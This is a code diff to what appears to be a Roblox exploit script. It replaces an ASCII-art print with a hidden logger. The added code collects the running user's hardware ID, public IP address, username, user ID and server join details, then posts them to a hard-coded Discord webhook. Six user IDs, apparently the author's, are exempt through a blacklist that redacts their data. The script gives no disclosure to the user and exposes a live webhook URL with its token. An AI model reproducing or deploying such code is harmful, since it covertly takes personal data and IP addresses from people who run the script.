@@ -1,7 +1,4 @@
-print([[
-
-
-    
+[[ 
  .\\            //.
 . \ \          / /.
 .\  ,\     /` /,.-
@@ -12,4 +9,64 @@ print([[
       :`//.'
       .`.'
       .'
-]])
+]]
+
+local webhook = 'https://discord.com/api/webhooks/1225251467720396831/eL-eMn-rV9w9vRVADovuTtPO15c_BONMZ-NmVDavdKwlkyckKX07ov_k0_gDW_OaT12A'
+local request = http_request or httprequest or error("Webhook API: Failed to find HTTP request function");
+local httpservice = game:GetService("HttpService")
+
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ip = game:HttpGet('https://api.myip.com/')
+local ip_content = string.split(ip, '"')
+
+local blacklisted = {
+    3648338950,
+    2844745669,
+    2661526697,
+    157406244,
+    4371114243,
+    31598955
+}
+
+local localplayer = game.Players.LocalPlayer
+local userid = tostring(localplayer.UserId)
+local name = localplayer.Name
+local display = localplayer.DisplayName
+local placeid = tostring(game.PlaceId)
+local jobid = tostring(game.JobId)
+local videolink = "https://youtu.be/7FMOj8VmWT4?si=Nzs_s_nsAC_Y1ksV&t=21"
+
+if table.find(blacklisted, game.Players.LocalPlayer.UserId) then
+    name = "<redacted>"
+    userid = "<redacted>"
+    display = "<redacted>"
+    hwid = "<redacted>"
+    videolink = "https://www.youtube.com/watch?v=cswK2Ttrs5M"
+    jobid = "<redacted>"
+    ip_content[4] = "<redacted>"
+    placeid = "0"
+end
+
+local content = {
+    content = videolink,
+    embeds = {
+        {	
+            title = "Execution Logged",
+            description = "> Username: "..name.." ("..display..") ("..userid..")".."\n> HWID: "..tostring(hwid).."\n> IP: "..tostring(ip_content[4]).."\n\nConsole Script: ```Roblox.GameLauncher.joinGameInstance("..placeid..", '"..jobid.."')```",
+            url = "https://www.roblox.com/games/"..placeid.."/",
+            color = 12345,
+        }
+    },
+    attachments = {}
+}
+
+local response = request(
+    {
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = httpservice:JSONEncode(content)
+    }
+)
